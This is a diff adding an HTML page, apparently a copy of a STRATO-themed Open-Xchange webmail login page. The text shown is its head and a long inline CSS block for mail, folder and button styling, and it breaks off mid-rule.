@@ -1,0 +1,2334 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="stylesheet" href="./css/login.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <style type="text/css" data-require-src="v=7.10.4-22.20210323.120412/apps/themes/strato/style">
+    .io-ox-dialog-wrapper .sms-dialog .modal-body {
+        max-height: none;
+        overflow: inherit
+    }
+
+    .first-start-wizard .modal-body {
+        height: auto
+    }
+
+    .window-sidepanel .generic-toolbar.bottom,
+    .window-sidepanel,
+    .window-search,
+    .rightside.mail-detail-pane {
+        background: #f8f8f8
+    }
+
+    #io-ox-top-logo-small {
+        float: left;
+        width: 30px;
+        background-image: url('apps/themes/strato/logo-small.png')
+    }
+
+    .show-banner #io-ox-top-logo-small {
+        display: none
+    }
+
+    h1 {
+        font-weight: normal
+    }
+
+    h2 {
+        font-weight: normal;
+        color: #333
+    }
+
+    h3 {
+        font-weight: normal;
+        color: #333
+    }
+
+    h4 {
+        color: #333;
+        font-weight: bold
+    }
+
+    a:link {
+        color: #07b
+    }
+
+    a:focus,
+    a:hover {
+        color: #004576;
+        outline: none
+    }
+
+    a:active {
+        color: #0074b5;
+        outline: none
+    }
+
+    .io-ox-mail-compose .sender .address,
+    .btn-link,
+    .io-ox-action-link {
+        color: #07b
+    }
+
+    .io-ox-mail-compose .sender .address.disabled,
+    .btn-link.disabled,
+    .io-ox-action-link.disabled {
+        color: #ccc
+    }
+
+    .io-ox-mail-compose .sender .address.disabled:hover,
+    .btn-link.disabled:hover,
+    .io-ox-action-link.disabled:hover {
+        color: #ccc;
+        text-decoration: none
+    }
+
+    .io-ox-mail-compose .sender .address.disabled:active,
+    .btn-link.disabled:active,
+    .io-ox-action-link.disabled:active {
+        color: #ccc;
+        text-decoration: none
+    }
+
+    .io-ox-mail-compose .sender .address:hover,
+    .btn-link:hover,
+    .io-ox-action-link:hover {
+        color: #004576;
+        text-decoration: none
+    }
+
+    .io-ox-mail-compose .sender .address:active,
+    .btn-link:active,
+    .io-ox-action-link:active {
+        color: #0074b5;
+        text-decoration: none
+    }
+
+    .io-ox-mail-compose .sender .address.dropdown-toggle:not([data-action="create"]):focus,
+    .btn-link.dropdown-toggle:not([data-action="create"]):focus,
+    .io-ox-action-link.dropdown-toggle:not([data-action="create"]):focus,
+    .io-ox-mail-compose .sender .address.dropdown-toggle:not([data-action="create"]):hover,
+    .btn-link.dropdown-toggle:not([data-action="create"]):hover,
+    .io-ox-action-link.dropdown-toggle:not([data-action="create"]):hover {
+        color: #004576
+    }
+
+    .io-ox-mail-compose .sender .address.dropdown-toggle:not([data-action="create"]):active,
+    .btn-link.dropdown-toggle:not([data-action="create"]):active,
+    .io-ox-action-link.dropdown-toggle:not([data-action="create"]):active {
+        color: #0074b5
+    }
+
+    .io-ox-office-main.popup-container .button.selected {
+        background: #999 !important
+    }
+
+    .io-ox-office-main.popup-container .button.selected .caption {
+        color: #000 !important
+    }
+
+    .io-ox-office-main.popup-container .button .caption {
+        color: #000 !important
+    }
+
+    .dropdown .dropdown-menu li a:focus {
+        color: #000
+    }
+
+    .dropdown>.actionlink {
+        color: #999
+    }
+
+    .dropdown>.actionlink:hover {
+        color: #999;
+        color: #004576
+    }
+
+    .dropdown>.actionlink:active {
+        color: #999;
+        color: #0074b5
+    }
+
+    .io-ox-action-link.upsell i {
+        padding-right: 10px
+    }
+
+    #io-ox-core #io-ox-appcontrol {
+        border-bottom-color: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-top-logo img {
+        height: 34px;
+        width: 260px
+    }
+
+    @media (max-width:320px) {
+        #io-ox-core #io-ox-appcontrol #io-ox-top-logo {
+            display: block;
+            width: 80px !important
+        }
+    }
+
+    #io-ox-core #io-ox-appcontrol .logo-btn:focus,
+    #io-ox-core #io-ox-appcontrol .logo-btn:hover {
+        color: #fff;
+        background: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-topsearch {
+        margin: 0
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-notifications-icon {
+        min-width: 50px
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-quicklaunch>button {
+        color: #fff
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-quicklaunch>button:focus,
+    #io-ox-core #io-ox-appcontrol #io-ox-quicklaunch>button:hover {
+        color: #fff;
+        background: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher>a {
+        color: #fff
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher>a:hover,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher>a:focus {
+        color: #fff;
+        background: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher:focus>a,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher:hover>a {
+        color: #fff;
+        background: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar #io-ox-launcher>button {
+        height: 62px;
+        color: #fff
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar #io-ox-launcher>button:focus,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar #io-ox-launcher>button:hover {
+        color: #fff;
+        background: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:hover *,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:focus *,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:hover i,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:focus i {
+        color: #fff;
+        background: #e70
+    }
+
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .dropdown-menu>li>a:hover,
+    #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .dropdown-menu>li>a:focus {
+        background: #e70
+    }
+
+    .smartphone #io-ox-core #io-ox-appcontrol #io-ox-top-logo,
+    .smartphone #io-ox-core #io-ox-appcontrol #io-ox-toprightbar #io-ox-launcher>button.launcher-btn {
+        height: 48px
+    }
+
+    .launcher-dropdown.dropdown-menu li a:focus i,
+    .launcher-dropdown.dropdown-menu li a:focus .title {
+        color: #000
+    }
+
+    .folder-tree .tree-container .selectable {
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable:focus .folder-node div {
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable .folder-pubsub {
+        color: #999 !important
+    }
+
+    .folder-tree .tree-container .selectable .folder-icon {
+        color: #999
+    }
+
+    .folder-tree .tree-container .selectable>.folder-node:focus,
+    .folder-tree .tree-container .selectable>.folder-node:hover,
+    .folder-tree .tree-container .selectable>.folder-node:active {
+        background: #eaeaea;
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable>.folder-node:focus .folder-icon i,
+    .folder-tree .tree-container .selectable>.folder-node:hover .folder-icon i,
+    .folder-tree .tree-container .selectable>.folder-node:active .folder-icon i,
+    .folder-tree .tree-container .selectable>.folder-node:focus .default i,
+    .folder-tree .tree-container .selectable>.folder-node:hover .default i,
+    .folder-tree .tree-container .selectable>.folder-node:active .default i {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable>.folder-node:focus *,
+    .folder-tree .tree-container .selectable>.folder-node:hover *,
+    .folder-tree .tree-container .selectable>.folder-node:active * {
+        background: #eaeaea;
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable>.folder-node:focus .folder-counter,
+    .folder-tree .tree-container .selectable>.folder-node:hover .folder-counter,
+    .folder-tree .tree-container .selectable>.folder-node:active .folder-counter {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node {
+        background: #ddd;
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node>*,
+    .folder-tree .tree-container .selectable.selected>.folder-node>div i {
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node .folder-counter {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node .folder-options {
+        background: #999;
+        color: #fff
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node .folder-options i {
+        color: inherit
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node .folder-icon {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node .folder-icon i {
+        color: inherit
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus,
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover {
+        background: #ddd
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-icon,
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-icon,
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus .default i,
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover .default i {
+        color: #fff
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus *:not(.folder-options),
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover *:not(.folder-options) {
+        background: #ddd;
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-icon i,
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-icon i {
+        color: #999
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-options i,
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-options i {
+        background: #999;
+        color: #fff
+    }
+
+    .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-counter,
+    .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-counter {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable.selected:hover,
+    .folder-tree .tree-container .selectable.selected:focus {
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable.selected:hover>*,
+    .folder-tree .tree-container .selectable.selected:focus>*,
+    .folder-tree .tree-container .selectable.selected:hover>div i,
+    .folder-tree .tree-container .selectable.selected:focus>div i {
+        color: #333
+    }
+
+    .folder-tree .tree-container .selectable.selected:hover .folder-counter,
+    .folder-tree .tree-container .selectable.selected:focus .folder-counter {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable.selected:hover .folder-options,
+    .folder-tree .tree-container .selectable.selected:focus .folder-options {
+        background: #999;
+        color: #fff
+    }
+
+    .folder-tree .tree-container .selectable.selected:hover .folder-options i,
+    .folder-tree .tree-container .selectable.selected:focus .folder-options i {
+        color: inherit
+    }
+
+    .folder-tree .tree-container .selectable.selected:hover .folder-counter,
+    .folder-tree .tree-container .selectable.selected:focus .folder-counter {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .selectable .folder-counter {
+        color: #f80
+    }
+
+    .folder-tree .tree-container .show-all-checkbox label,
+    .folder-tree .tree-container .links {
+        font-weight: 400
+    }
+
+    .folder-tree .upsell i {
+        padding-right: 10px
+    }
+
+    @media (max-width:480px) and (orientation:portrait),
+    (max-height:480px) and (orientation:landscape) {
+        .smartphone #io-ox-top-logo {
+            display: block;
+            margin: 12px 0 0 10px !important;
+            background: url('apps/themes/strato/strato_mobil.png') no-repeat;
+            background-size: contain;
+            float: right;
+            width: 105px !important
+        }
+
+        .smartphone #io-ox-top-logo img {
+            display: none
+        }
+    }
+
+    @media only screen and (-webkit-min-device-pixel-ratio:1.5),
+    only screen and (-moz-min-device-pixel-ratio:1.5),
+    only screen and (min-device-pixel-ratio:1.5),
+    only screen and (min-resolution:240dppx) {
+        .smartphone #io-ox-top-logo {
+            background-image: url('apps/themes/strato/strato_mobil_ret.png')
+        }
+    }
+
+    @media all and (max-width:320px) {
+        .smartphone #io-ox-top-logo {
+            display: none
+        }
+    }
+
+    .list-view.visible-selection .list-item:hover,
+    .list-view.visible-selection .list-item:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .list-view.visible-selection .list-item.selected {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .list-view.visible-selection .list-item.selected:hover,
+    .list-view.visible-selection .list-item.selected:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .list-view.visible-selection .list-item.selected .fa-checkmark {
+        color: #0074b5
+    }
+
+    .list-view.visible-selection.has-focus .list-item.selected i.fa-checkmark {
+        color: #0074b5
+    }
+
+    .vgrid-cell:hover,
+    .vgrid-cell:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .vgrid-cell.selected {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .vgrid-cell.selected:hover,
+    .vgrid-cell.selected:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .vgrid-cell.selected .vgrid-cell-checkbox i.fa:before {
+        color: #0074b5
+    }
+
+    .address-picker.visible-selection.has-focus .list-item.selected,
+    .chronos-item.visible-selection.has-focus .list-item.selected,
+    .file-list-view.visible-selection.has-focus .list-item.selected {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .address-picker.visible-selection.has-focus .list-item.selected:hover,
+    .chronos-item.visible-selection.has-focus .list-item.selected:hover,
+    .file-list-view.visible-selection.has-focus .list-item.selected:hover,
+    .address-picker.visible-selection.has-focus .list-item.selected:focus,
+    .chronos-item.visible-selection.has-focus .list-item.selected:focus,
+    .file-list-view.visible-selection.has-focus .list-item.selected:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .address-picker.visible-selection.has-focus .list-item.selected *,
+    .chronos-item.visible-selection.has-focus .list-item.selected *,
+    .file-list-view.visible-selection.has-focus .list-item.selected *,
+    .address-picker.visible-selection.has-focus .list-item.selected .file-type-icon:before,
+    .chronos-item.visible-selection.has-focus .list-item.selected .file-type-icon:before,
+    .file-list-view.visible-selection.has-focus .list-item.selected .file-type-icon:before {
+        color: #000 !important
+    }
+
+    .address-picker.visible-selection.has-focus .list-item.selected .list-item-checkmark .fa-checkmark:before,
+    .chronos-item.visible-selection.has-focus .list-item.selected .list-item-checkmark .fa-checkmark:before,
+    .file-list-view.visible-selection.has-focus .list-item.selected .list-item-checkmark .fa-checkmark:before {
+        color: #0074b5 !important
+    }
+
+    .address-picker.visible-selection.has-focus .list-item.selected .tooltip>div,
+    .chronos-item.visible-selection.has-focus .list-item.selected .tooltip>div,
+    .file-list-view.visible-selection.has-focus .list-item.selected .tooltip>div {
+        color: #fff !important
+    }
+
+    .address-picker.visible-selection.has-focus .list-item.selected .vgrid-cell-checkbox i.fa:before,
+    .chronos-item.visible-selection.has-focus .list-item.selected .vgrid-cell-checkbox i.fa:before,
+    .file-list-view.visible-selection.has-focus .list-item.selected .vgrid-cell-checkbox i.fa:before {
+        color: #0074b5
+    }
+
+    .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected *,
+    .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected:not(.marked):focus * {
+        color: #000
+    }
+
+    .has-focus .vgrid-cell:hover,
+    .has-focus .vgrid-cell:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .has-focus .vgrid-cell.selected {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .has-focus .vgrid-cell.selected:hover,
+    .has-focus .vgrid-cell.selected:focus {
+        background: #e9f0fa;
+        color: #000
+    }
+
+    .has-focus .vgrid-cell.selected .vgrid-cell-checkbox i.fa:before {
+        color: #0074b5
+    }
+
+    .btn:not(.btn-search),
+    .mail-detail .shadow-root-container::shadow .mail-detail-content .btn,
+    .mail-detail .content .btn {
+        padding: 4px 20px;
+        min-width: 100px;
+        border-radius: 5px;
+        text-align: center;
+        min-height: 30px;
+        box-sizing: border-box
+    }
+
+    .btn:not(.btn-search):focus {
+        outline: none
+    }
+
+    .btn:not(.btn-search).btn-default,
+    .btn:not(.btn-search).pull-left,
+    .btn:not(.btn-search).wizard-prev {
+        color: #666;
+        background-image: -webkit-linear-gradient(top, #f8f8f8 0, #eaeaea 100%);
+        background-image: -o-linear-gradient(top, #f8f8f8 0, #eaeaea 100%);
+        background-image: linear-gradient(to bottom, #f8f8f8 0, #eaeaea 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff8f8f8', endColorstr='#ffeaeaea', GradientType=0);
+        background-repeat: repeat-x;
+        border-color: #ccc
+    }
+
+    .btn:not(.btn-search).btn-default:hover,
+    .btn:not(.btn-search).pull-left:hover,
+    .btn:not(.btn-search).wizard-prev:hover {
+        outline: none;
+        background-image: -webkit-linear-gradient(top, #f8f8f8 0, #ccc 100%);
+        background-image: -o-linear-gradient(top, #f8f8f8 0, #ccc 100%);
+        background-image: linear-gradient(to bottom, #f8f8f8 0, #ccc 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff8f8f8', endColorstr='#ffcccccc', GradientType=0);
+        background-repeat: repeat-x;
+        border-color: #ccc;
+        color: #07b
+    }
+
+    .btn:not(.btn-search).btn-default:active,
+    .btn:not(.btn-search).pull-left:active,
+    .btn:not(.btn-search).wizard-prev:active {
+        background-image: -webkit-linear-gradient(top, #ccc 20%, #eaeaea 80%);
+        background-image: -o-linear-gradient(top, #ccc 20%, #eaeaea 80%);
+        background-image: linear-gradient(to bottom, #ccc 20%, #eaeaea 80%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffcccccc', endColorstr='#ffeaeaea', GradientType=0);
+        background-repeat: repeat-x;
+        border-color: #ccc;
+        color: #0074b5
+    }
+
+    .btn:not(.btn-search).wizard-next.btn-disabled,
+    .btn:not(.btn-search).btn-primary {
+        color: #fff;
+        border-color: #07b;
+        background-image: -webkit-linear-gradient(top, #0074b5 0, #07b 100%);
+        background-image: -o-linear-gradient(top, #0074b5 0, #07b 100%);
+        background-image: linear-gradient(to bottom, #0074b5 0, #07b 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0074b5', endColorstr='#ff0077bb', GradientType=0);
+        background-repeat: repeat-x
+    }
+
+    .btn:not(.btn-search).wizard-next.btn-disabled:hover,
+    .btn:not(.btn-search).btn-primary:hover {
+        outline: none;
+        background-image: -webkit-linear-gradient(top, #0074b5 0, #004576 100%);
+        background-image: -o-linear-gradient(top, #0074b5 0, #004576 100%);
+        background-image: linear-gradient(to bottom, #0074b5 0, #004576 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0074b5', endColorstr='#ff004576', GradientType=0);
+        background-repeat: repeat-x;
+        border-color: #004576;
+        color: #fff
+    }
+
+    .btn:not(.btn-search).wizard-next.btn-disabled:active,
+    .btn:not(.btn-search).btn-primary:active {
+        background-image: -webkit-linear-gradient(top, #004576 20%, #07b 80%);
+        background-image: -o-linear-gradient(top, #004576 20%, #07b 80%);
+        background-image: linear-gradient(to bottom, #004576 20%, #07b 80%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff004576', endColorstr='#ff0077bb', GradientType=0);
+        background-repeat: repeat-x;
+        border-color: #004576;
+        color: #fff
+    }
+
+    .btn:not(.btn-search).wizard-next.btn-disabled[disabled],
+    .btn:not(.btn-search).btn-primary[disabled] {
+        background: #8CB9D6;
+        border-color: #66A2C9;
+        font-color: rgba(255, 255, 255, 0.5)
+    }
+
+    .io-ox-viewer.viewer-dark-theme .viewer-sidebar .viewer-uploadnewversion>.form-group>.btn-default {
+        border-radius: 3px;
+        background-image: none
+    }
+
+    .mail-detail .shadow-root-container::shadow .mail-detail-content .btn,
+    .mail-detail .content .btn {
+        font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif !important;
+        font-size: 14px;
+        padding-top: 6px
+    }
+
+    .mail-detail .shadow-root-container::shadow .mail-detail-content a.deep-link,
+    .mail-detail .content a.deep-link {
+        color: #fff;
+        border-color: #07b;
+        background-image: -webkit-linear-gradient(top, #0074b5 0, #07b 100%);
+        background-image: -o-linear-gradient(top, #0074b5 0, #07b 100%);
+        background-image: linear-gradient(to bottom, #0074b5 0, #07b 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0074b5', endColorstr='#ff0077bb', GradientType=0);
+        background-repeat: repeat-x;
+        font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif !important;
+        font-size: 14px;
+        min-width: 100px;
+        border-radius: 5px;
+        text-align: center
+    }
+
+    .mail-detail .upsell i {
+        padding-right: 10px
+    }
+
+    .input-group .btn.input-group-addon {
+        min-width: 25px;
+        border-radius: 0 5px 5px 0
+    }
+
+    .form-control {
+        border-color: #ddd
+    }
+
+    .form-control:focus,
+    .form-control.focus {
+        border-color: #999;
+        box-shadow: none
+    }
+
+    .form-control:not(.search-field):not(textarea):not(.tokenfield) {
+        height: 30px
+    }
+
+    .form-control:not(.search-field):not(textarea):not(.tokenfield)[disabled] {
+        background: #f3f3f3
+    }
+
+    .io-ox-office-main .input-wrapper>input.form-control {
+        height: 100%
+    }
+
+    .io-ox-mail-compose .mail-compose-fields .line-focus:focus-within {
+        border-top: 1px solid;
+        border-color: #999;
+        box-shadow: none;
+        margin-bottom: -1px;
+        min-height: 41px;
+        top: -1px
+    }
+
+    .io-ox-mail-compose .editable-toolbar.fixed {
+        top: 160px;
+        opacity: 1
+    }
+
+    .error .form-control:not(.search-field) {
+        border-color: #df1100
+    }
+
+    .help-block.error {
+        color: #df1100
+    }
+
+    @media (min-width:480px) {
+        .row label:not(.checkbox):not(.radio):not(.control-label.col-xs-12) {
+            font-weight: normal
+        }
+    }
+
+    @media (min-width:480px) {
+
+        .form-horizontal .control-label,
+        label:not(.select-all):not(.checkbox):not(.radio):not(.control-label.col-xs-12),
+        legend {
+            font-weight: normal
+        }
+    }
+
+    .thread-view-list>h1 {
+        font-weight: normal
+    }
+
+    .header-name,
+    .clear-title {
+        font-weight: bold
+    }
+
+    .window-container.header-top .window-header {
+        height: auto
+    }
+
+    .window-container.header-top .window-header.default-header-padding {
+        padding: 20px
+    }
+
+    .window-container.header-top .window-body {
+        top: 60px
+    }
+
+    .mail-detail header>a,
+    .mail-detail header .unread-toggle {
+        color: #07b
+    }
+
+    .mail-detail header>a:hover,
+    .mail-detail header .unread-toggle:hover,
+    .mail-detail header>a:focus,
+    .mail-detail header .unread-toggle:focus {
+        cursor: default;
+        color: #07b
+    }
+
+    .io-ox-mail-compose-window .window-header .row {
+        display: -webkit-flex;
+        display: flex;
+        -webkit-align-items: center;
+        align-items: center
+    }
+
+    .io-ox-mail-compose-window .window-header h1.clear-title {
+        font-weight: normal
+    }
+
+    .io-ox-dropzone-active .io-ox-dropzone-multiple-overlay {
+        background-color: rgba(0, 0, 0, 0.7)
+    }
+
+    .io-ox-dropzone-multiple-overlay .io-ox-dropzone-action div {
+        border: 1px dashed #aaa;
+        background: #fff
+    }
+
+    .io-ox-dropzone-multiple-overlay .io-ox-dropzone-action.io-ox-dropzone-hover div {
+        border-color: 1px dashed #aaa;
+        background-color: #fff
+    }
+
+    #io-ox-windowmanager-pane {
+        background-color: #fff
+    }
+
+    #io-ox-windowmanager-pane .progress-bar {
+        background-image: -webkit-linear-gradient(top, #ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
+        background-image: linear-gradient(#ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%)
+    }
+
+    #io-ox-windowmanager-pane .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget[data-widget-type="notifications"] h3 {
+        font-size: 14px;
+        font-weight: bold;
+        margin: 0
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget[data-widget-type="upsell"] h2 {
+        color: #f80
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget .content:focus {
+        background: transparent
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell ul {
+        text-align: left;
+        list-style: disc;
+        margin-bottom: 9px
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell .fa-arrow-circle-up {
+        cursor: pointer;
+        font-size: 5em;
+        padding-bottom: 15px
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell h2 {
+        color: #f80;
+        overflow: visible;
+        text-overflow: none;
+        height: auto;
+        white-space: normal;
+        cursor: pointer
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell .accent {
+        color: #f80
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal li.widget .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-black .progress-bar {
+        background-image: -webkit-linear-gradient(top, #333 0, #333 50%, #333 51%, #333 100%);
+        background-image: linear-gradient(#333 0, #333 50%, #333 51%, #333 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-black .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-red .progress-bar {
+        background-image: -webkit-linear-gradient(top, #c00 0, #c00 50%, #900 51%, #900 100%);
+        background-image: linear-gradient(#c00 0, #c00 50%, #900 51%, #900 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-red .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-orange .progress-bar {
+        background-image: -webkit-linear-gradient(top, #f80 0, #f80 50%, #f80 51%, #f80 100%);
+        background-image: linear-gradient(#f80 0, #f80 50%, #f80 51%, #f80 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-orange .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightgreen .progress-bar {
+        background-image: -webkit-linear-gradient(top, #79bb32 0, #79bb32 50%, #5f9327 51%, #5f9327 100%);
+        background-image: linear-gradient(#79bb32 0, #79bb32 50%, #5f9327 51%, #5f9327 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightgreen .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-green .progress-bar {
+        background-image: -webkit-linear-gradient(top, #198819 0, #198819 50%, #198819 51%, #198819 100%);
+        background-image: linear-gradient(#198819 0, #198819 50%, #198819 51%, #198819 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-green .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightblue .progress-bar {
+        background-image: -webkit-linear-gradient(top, #04aef4 0, #04aef4 50%, #048ac2 51%, #048ac2 100%);
+        background-image: linear-gradient(#04aef4 0, #04aef4 50%, #048ac2 51%, #048ac2 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightblue .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-blue .progress-bar {
+        background-image: -webkit-linear-gradient(top, #07b 0, #07b 50%, #005788 51%, #005788 100%);
+        background-image: linear-gradient(#07b 0, #07b 50%, #005788 51%, #005788 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-blue .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-purple .progress-bar {
+        background-image: -webkit-linear-gradient(top, #7e16cf 0, #7e16cf 50%, #6211a1 51%, #6211a1 100%);
+        background-image: linear-gradient(#7e16cf 0, #7e16cf 50%, #6211a1 51%, #6211a1 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-purple .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-pink .progress-bar {
+        background-image: -webkit-linear-gradient(top, #b316ad 0, #b316ad 50%, #851181 51%, #851181 100%);
+        background-image: linear-gradient(#b316ad 0, #b316ad 50%, #851181 51%, #851181 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-pink .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-gray .progress-bar {
+        background-image: -webkit-linear-gradient(top, #444 0, #444 50%, #2b2b2b 51%, #2b2b2b 100%);
+        background-image: linear-gradient(#444 0, #444 50%, #2b2b2b 51%, #2b2b2b 100%)
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .widget-color-gray .progress-bar.bar-danger {
+        background: #c00
+    }
+
+    #io-ox-windowmanager-pane .io-ox-portal .badge {
+        font-weight: normal;
+        background: #ddd;
+        color: #666;
+        border-radius: 5px;
+        padding: 1px 7px
+    }
+
+    .window-sidepanel .upsell-link-wrapper {
+        position: static;
+        width: 100%;
+        height: 60px;
+        overflow: hidden
+    }
+
+    .window-sidepanel .upsell-link {
+        position: relative;
+        left: 40px;
+        top: 14px;
+        float: left
+    }
+
+    .window-sidepanel .upsell-link a {
+        border-radius: 0;
+        padding: 4px 10px;
+        color: #fff;
+        background: #f80;
+        display: -webkit-flex;
+        display: flex
+    }
+
+    .window-sidepanel .upsell-link a:hover,
+    .window-sidepanel .upsell-link a:focus {
+        background: #dd5800;
+        outline: none
+    }
+
+    .window-sidepanel .upsell-link a:active {
+        color: rgba(255, 255, 255, 0.7);
+        background: #dd5800;
+        outline: none
+    }
+
+    .window-sidepanel .upsell-link a i {
+        font-size: 1.5em;
+        margin-right: 10px
+    }
+
+    .window-sidepanel .upsell-link a span {
+        padding-top: 2px
+    }
+
+    .window-sidepanel .links.quota .progress .progress-bar {
